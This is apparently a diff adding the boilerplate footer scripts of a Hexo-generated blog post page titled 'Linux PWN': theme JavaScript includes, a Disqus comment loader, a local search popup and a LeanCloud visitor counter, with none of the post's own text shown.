+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://blog-rvy0h9n8wm.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://blog.pwntools.xyz/2019/10/28/Linux-PWN/';
+          this.page.identifier = '2019/10/28/Linux-PWN/';
+          this.page.title = 'Linux PWN';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://blog-rvy0h9n8wm.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("n0AbSyGdjNFsq5EJpo35XEw8-gzGzoHsz", "ExPunrF0qf4zjYVpkEhlUtSn");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
